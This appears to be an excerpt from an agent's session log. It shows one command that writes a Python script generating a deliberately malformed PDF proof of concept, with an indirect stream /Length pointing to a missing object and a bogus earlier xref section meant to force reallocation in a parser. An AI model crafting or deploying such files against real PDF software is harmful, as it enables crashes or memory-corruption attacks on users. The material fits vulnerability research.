Running command: cat > /workspace/gen_poc.py << 'PYTHON'
import struct

def pad_offset(offset):
    """Format offset as 10-digit string"""
    return f"{offset:010d}"

# Build PDF content
pdf = bytearray()

# Header
pdf += b"%PDF-1.4\n"

# Object 2: Catalog
obj2_offset = len(pdf)
pdf += b"2 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n"

# Object 3: Pages
obj3_offset = len(pdf)
pdf += b"3 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n"

# Object 4: Page (references object 1 as Contents)
obj4_offset = len(pdf)
pdf += b"4 0 obj\n<< /Type /Page /Parent 3 0 R /Contents 1 0 R /MediaBox [0 0 100 100] >>\nendobj\n"

# Object 1: Stream with Length = 5 0 R (indirect reference)
obj1_offset = len(pdf)
pdf += b"1 0 obj\n<< /Length 5 0 R >>\nstream\n"
pdf += b"BT /F1 12 Tf (Hello) Tj ET"
pdf += b"\nendstream\nendobj\n"

# Previous XRef section (will cause reallocation)
prev_xref_offset = len(pdf)
pdf += b"xref\n"
pdf += b"1024 2\n"
pdf += b"0000000000 00000 f \r\n"
pdf += b"0000000000 00000 f \r\n"
pdf += b"trailer\n"
pdf += b"<< /Size 1026 >>\n"
pdf += b"startxref\n"
pdf += b"0\n"
pdf += b"%%EOF\n"

# Main XRef section
main_xref_offset = len(pdf)
pdf += b"xref\n"
pdf += b"0 5\n"
pdf += f"0000000000 65535 f \r\n".encode()
pdf += f"{pad_offset(obj1_offset)} 00000 n \r\n".encode()
pdf += f"{pad_offset(obj2_offset)} 00000 n \r\n".encode()
pdf += f"{pad_offset(obj3_offset)} 00000 n \r\n".encode()
pdf += f"{pad_offset(obj4_offset)} 00000 n \r\n".encode()
pdf += b"trailer\n"
pdf += f"<< /Size 6 /Root 2 0 R /Prev {prev_xref_offset} >>\n".encode()
pdf += b"startxref\n"
pdf += f"{main_xref_offset}\n".encode()
pdf += b"%%EOF\n"

with open("/workspace/poc.pdf", "wb") as f:
    f.write(pdf)

print(f"PDF size: {len(pdf)} bytes")
print(f"obj1_offset: {obj1_offset}")
print(f"obj2_offset: {obj2_offset}")
print(f"obj3_offset: {obj3_offset}")
print(f"obj4_offset: {obj4_offset}")
print(f"prev_xref_offset: {prev_xref_offset}")
print(f"main_xref_offset: {main_xref_offset}")
